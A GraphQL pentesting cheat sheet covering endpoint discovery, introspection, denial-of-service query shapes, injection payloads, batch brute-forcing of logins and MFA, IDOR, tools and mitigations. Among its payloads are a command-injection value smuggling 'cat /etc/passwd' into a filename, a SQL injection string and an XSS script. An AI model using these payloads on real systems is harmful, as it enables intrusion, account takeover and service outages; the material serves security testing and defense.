---
title: GraphQL
---

# GraphQL

GraphQL is a **query language for APIs** and a **server-side runtime** for executing the query. The server's GraphQL runtime takes care of executing the query and ensuring that only the required data is fetched and returned. It uses a single endpoint for all requests.

---

## Fundamentals of GraphQL

1. **Schema**: defines the structure of the data that can be queried or mutated by clients
2. **Types**: represents the shape of data that can be queried

```jsx
# Syntax
type Object_name
{
   field_name1: data_type
   field_name2: data_type 
   ....
   field_nameN: data_type
}
```

```jsx
# Example
type User {
  id: ID!
  username: String!
  email: String!
  age: Int!
  isAdmin: Boolean!
}
```

1. **Fields**: basic unit of data retrieval in GraphQL, used to request specific pieces of data about an object
2. **Queries**: used by the client to request specific data from the server

```jsx
#GraphQL Query
query GetUser {
	user(id:"1"){
		username
		email
		isAdmin
	}
}
```

```jsx
#GraphQL Query Response
{
  "data": {
    "user": {
      "username": "admin",
      "email": "admin@email.com",
      "isAdmin": true
    }
  }
}
```

1. **Mutations**: used to modify data on the server, allows clients to create, update, or delete data
    
    ```jsx
    mutation CreateUser {
    	createUser(input: { username: "user", email: "user@example.com" }) {
    		id
    	}
    }
    ```
    
2. **Resolvers**: functions that determine how to fetch the data for a particular field
    
    ```jsx
    const resolvers = {
    	Query: {
    		user: (parent, args, context, info) => {
    		// Logic to fetch user data
    		}
    	}
    };
    ```
    
3. **Directives**: starts with `@`symbol, used to conditionally include fields, apply transformations, or provide metadata
    
    ```jsx
    query GetUsers {
    	users {
    		username
    		email
    		isAdmin @include(if: true)
    	}
    }
    ```
    
4. **Subscriptions**: allows clients to receive real-time updates from the server
    
    ```jsx
    subscription NewPosts {
    	newPost {
    		id
    		title
    		content
    	}
    }
    ```
    

---

### Finding GraphQL Endpoints

- Analyze the requests in proxy tool (Burp Suite)
    - To check if a URL is a GraphQL service:
        - send a **universal query:** `query{__typename}`
        - If the response includes `{"data": {"__typename": "Query"}}`, it confirms the URL hosts a GraphQL endpoint.
    - Test for **GET** method: `?query=query%3Dquery%7B__typename%7D`
    - Test for **POST** Content-Type:
        - application/x-www-form-urlencoded
        - multipart/form-data
- Common Endpoints:
    - `/graphql`
    - `/graphiql`
    - `/graphql.php`
    - `/graphql/console`
    - `/api`
    - `/api/graphql`
    - `/graphql/api`
    - `/graphql/graphql`

---

## Attack Surfaces

- Login Forms
- Sign-up Forms
- Update Profile
- Reset Password
- Search and Filter Arguments
- File Uploads

---

## Exploiting GraphQL Vulnerabilities

### 1. Information Disclosure Attacks

**1.1 Introspection Attack**

Basic Introspection Query:

```jsx
{
  __schema {
    types {
      name
      kind
      description
    }
  }
}
```

Full Introspection Query:

```jsx

    query IntrospectionQuery {
      __schema {
        
        queryType { name kind }
        mutationType { name kind }
        subscriptionType { name kind }
        types {
          ...FullType
        }
        directives {
          name
          description
          
          locations
          args {
            ...InputValue
          }
        }
      }
    }

    fragment FullType on __Type {
      kind
      name
      description
      
      
      fields(includeDeprecated: true) {
        name
        description
        args {
          ...InputValue
        }
        type {
          ...TypeRef
        }
        isDeprecated
        deprecationReason
      }
      inputFields {
        ...InputValue
      }
      interfaces {
        ...TypeRef
      }
      enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
      }
      possibleTypes {
        ...TypeRef
      }
    }

    fragment InputValue on __InputValue {
      name
      description
      type { ...TypeRef }
      defaultValue
      
      
    }

    fragment TypeRef on __Type {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
                ofType {
                  kind
                  name
                  ofType {
                    kind
                    name
                    ofType {
                      kind
                      name
                      ofType {
                        kind
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
```

**1.2 GraphiQL Interface Attack**

A **GraphiQL Interface Attack** refers to abusing an exposed **GraphiQL** interface—the in-browser IDE for interacting with GraphQL APIs—to gather information, execute unauthorized queries, or exploit misconfigurations

**Common Endpoints:**

- **`/graphiql`**
- **`/playground`**
- **`/v1/graphql`**
- **`/v2/graphql`**
- **`/console`**

**1.3 GraphQL Field Suggestions Attack**

 Supplying incorrect fields will trigger GraphQL to disclose fields with similar names.

```jsx
# Request
query {
  system
}
```

```jsx
# Response
{
  "errors": [
    {
      "message": "Cannot query field \"system\" on type \"Query\". Did you mean \"pastes\", \"paste\", \"systemUpdate\" or \"systemHealth\"?",
      "locations": [
        {
          "line": 2,
          "column": 3
        }
      ]
    }
  ]
}
```

### 2. Denial of Service Attacks

**2.1 Batching Query Attack:**

An attacker bundles thousands of requests into a single JSON array.

```jsx
[
  { "query": "query { user(id: 1) { username } }" },
  { "query": "query { user(id: 2) { username } }" },
  { "query": "query { user(id: 3) { username } }" }
]
```

**2.2 Alias-Based Attack / Single-Query Attack:**

An attacker duplicates the same field hundreds of times using unique labels.

```jsx
query {
  user1: user(id: 1) { username }
  user2: user(id: 2) { username }
  user3: user(id: 3) { username }
}
```

**2.3 Deep Query Attack:**

An attacker builds a circular query where Types references each other.

```jsx
query {
  author(id: "1") {
    books {
      author {
        books {
          author {
            books {
              # ... repeated hundreds of times
              title
            }
          }
        }
      }
    }
  }
}
```

**2.4 Field Duplication Attack:**

An attacker exploits the flexibility of GraphQL to overwhelm a server by requesting the same field multiple times in a single query.

```jsx
{'query': 'query { query_4f4722ea: test_table_aggregated { max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  } max {id id id id id id id id id id  }  } }'}
```

### 3. Generic Injection Attacks

**3.1 SQL Injection**

```jsx
query {
  product(id: "1 OR 1=1") {
    name
    price
  }
}
```

**3.2 Command Injection**

```jsx
mutation {
  generateBackup(filename: "backup.zip; cat /etc/passwd")
}
```

**3.3 Cross-Site Scripting (XSS)**

```jsx
mutation {
  createComment(content: "<script>alert('XSS')</script>")
}
```

### 4. Data Exposure Attacks

**4.1 Excessive Data Exposure**

Attackers can request and retrieve sensitive data if the API exposes it, as GraphQL allows clients to specify the data they want.

```jsx
query {
  user {
    id
    email
    password
    role
  }
}
```

**4.2 Excessive Data Exposure via Mutation Responses**

Occurs when the mutation's response returns more sensitive information than intended.

```jsx
mutation {
  updateUser(id: "123", name: "Hacked") {
    id
    name
    email
    passwordHash     # Leaked!
    apiKey           # Sensitive token exposed
  }
}

```

### 5. Over-Posting and Under-Posting

- **Over-Posting:** Attackers send unexpected fields in a mutation to update unauthorized data.
    
    ```jsx
    mutation {
      updateUser(id: "123", role: "admin") {
        id
      }
    }
    ```
    
- **Under-Posting:** Attackers exploit incomplete input validation, leading to unexpected behavior.
    
    ```jsx
    mutation {
      deleteUser(id: "789") {  # Missing confirm field
        id
      }
    }
    ```
    

---

## Bypasses

- Use a newline to bypass regex-based introspection blocking because GraphQL ignores spaces, newlines, and comma
    
    ```jsx
    {
      "query": "query{__schema
      {queryType{name}}}"
    }
    ```
    

---

## Advanced Attack Scenarios

### 1. Login Brute-force using Batch Query Attack

A standard brute-force attack would send thousands of POST requests to `/graphql`. A batching attack sends one request with 1,000 login attempts.

```jsx
[
  { "query": "mutation { login(user: \"admin\", pass: \"123456\") { token } }" },
  { "query": "mutation { login(user: \"admin\", pass: \"password\") { token } }" },
  { "query": "mutation { login(user: \"admin\", pass: \"qwerty\") { token } }" }
]
```

If the server returns a token for the second object but an error for the others, the attacker has successfully compromised the account in a single HTTP request. 

### 2. Bypassing MFA using Batch Query Attack

If an application requires a 6-digit OTP code, there are 1,000,000 possible combinations. By using batching, an attacker can send batches of 1,000 codes per request only needing 1,000 HTTP requests to exhaust the entire keyspace. 

### 3. IDOR

GraphQL APIs frequently use object identifiers (such as `id`, `userId`, or `orderId`) to fetch resources. If proper authorization checks are not implemented in the resolver, an attacker can manipulate these identifiers to access data belonging to other users.

```jsx
query {
  profile(userId: "101") { # change userID to fetch another user's data
    username
    email
    phone
    address
  }
}
```

---

## Impacts

- Bypass authentication or authorization checks by manipulating GraphQL queries or mutations.
- Gain unauthorized access to sensitive data exposed through the GraphQL schema.
- Extract confidential information such as user profiles, emails, API keys, tokens, or internal system details.
- Perform **schema introspection** to discover hidden queries, mutations, and internal API structures.
- Enumerate valid users, IDs, or resources through predictable query patterns.
- Abuse nested queries to retrieve excessive amounts of data in a single request.
- Escalate privileges by modifying parameters in mutations or accessing restricted fields.
- Execute deeply nested or recursive queries that overload the server.
- Cause **Denial of Service (DoS)** through expensive queries, batching attacks, or large query depth.
- Access fields that should be restricted due to **broken access control** or improper resolver validation.
- Perform **batching attacks** to test multiple credentials or IDs within a single request.
- Abuse poorly implemented input validation in mutations to manipulate application logic.

---

## Tools

- graphw00f: [https://github.com/dolevf/graphw00f](https://github.com/dolevf/graphw00f)
- graphql-voyager: [https://github.com/graphql-kit/graphql-voyager](https://github.com/graphql-kit/graphql-voyager)
- GraphQL-Cop: [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop)
- InQL: [https://github.com/doyensec/inql](https://github.com/doyensec/inql)
- Clairvoyance: [nikitastupin/clairvoyance: Obtain GraphQL API schema even if the introspection is disabled](https://github.com/nikitastupin/clairvoyance)

---

## Mitigations & Preventions

- Disable Introspection (When Possible)
- Lock Down Suggestions → Disable autocomplete suggestions that can be exploited via tools like Clairvoyance.
- Review Schema Exposure → Never expose private fields like emails or user IDs by mistake.
- **Preventing Rate Limiting Bypass:**
    - Limit query depth to avoid DoS attacks via deep nesting
    - Set operation limits (number of fields, aliases, root operations)
    - Implement cost analysis: score and reject overly complex queries

---

## Good To Read

[GraphQL Field Duplication Denial of Service (DoS) · Advisory · directus/directus](https://github.com/directus/directus/security/advisories/GHSA-7hmh-pfrp-vcx4)

[HackerOne | Report #291531 - Introspection query leaks sensitive graphql system information. | HackerOne](https://hackerone.com/reports/291531)

[https://hackerone.com/reports/885539](https://hackerone.com/reports/885539)

[hackerone-reports/tops_by_bug_type/TOPGRAPHQL.md at master · reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPGRAPHQL.md)

---

## References

[GraphQL Pentesting: A Beginner’s Guide to Advanced. | by Madhurendra Kumar | Medium](https://medium.com/@m14r41/graphql-pentesting-a-beginners-guide-to-advanced-08c29bf82979)

[GraphQL - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/graphql.html)

[GraphQL Over HTTP](https://graphql.github.io/graphql-over-http/draft/#sec-GET)

[Request Customization | Yoga](https://the-guild.dev/graphql/yoga-server/docs/features/request-customization)

[GraphQL API Vulnerabilities and Common Attacks | Imperva](https://www.imperva.com/blog/graphql-vulnerabilities-common-attacks/#graphiQL)

[What is GraphQL Batching Attack? Exploits & Impact](https://blogs.jsmon.sh/what-is-graphql-batching-attack-ways-to-exploit-examples-and-impact/)

[GraphQL API vulnerabilities, Excessive Data Exposure, Tools for Securing GraphQL APIs | by vikas kumar | Medium](https://medium.com/@vikaskumar01/graphql-api-vulnerabilities-excessive-data-exposure-tools-for-securing-graphql-apis-24fe4fac152e)